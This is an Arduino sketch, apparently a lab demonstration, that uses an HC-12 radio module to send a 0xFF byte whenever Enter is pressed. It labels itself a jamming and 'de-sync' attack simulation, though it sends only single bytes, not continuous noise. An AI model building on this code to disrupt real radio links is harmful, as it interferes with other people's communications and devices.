//Simulates a jamming attack by spamming the frequency with noise
#include <SoftwareSerial.h>
unsigned char hc12tx=6;
unsigned char hc12rx=5;
unsigned char hc12set=13;
unsigned long counter=0;
unsigned char r=0xff;  //Holds the malicious byte to send
unsigned char s=0xff;  //Holds the malicious byte to send
unsigned char t=0xff;  //Holds the malicious byte to send
unsigned char u=0xff;  //Holds the malicious byte to send
unsigned char v=0xff;  //Holds the malicious byte to send

char buff[63];

SoftwareSerial HC12(hc12tx, hc12rx);

void setup(){
	randomSeed(analogRead(0));
	pinMode(hc12set, OUTPUT);
	digitalWrite(hc12set, HIGH);
	HC12.begin(9600);
	Serial.begin(9600);
	Serial.println("Starting de-sync attack! Press enter to execute");
}//setup()

void loop(){
	if(Serial.available()>0){
		//Send the attack
		Serial.read();  //Clear the serial buffer
		// r=random(255);
		// s=random(255);
		// t=random(255);
		// u=random(255);
		// v=random(255);
		HC12.write(r);
		// HC12.write(s);
		// HC12.write(t);
		// HC12.write(u);
		// HC12.write(v);

		Serial.print("Sent ");
		Serial.print(r, HEX);
		// Serial.print(" ");
		// Serial.print(s, HEX);
		// Serial.print(" ");
		// Serial.print(t, HEX);
		// Serial.print(" ");
		// Serial.print(u, HEX);
		// Serial.print(" ");
		// Serial.print(v, HEX);
		Serial.println("!");
	}//if()
}//loop()
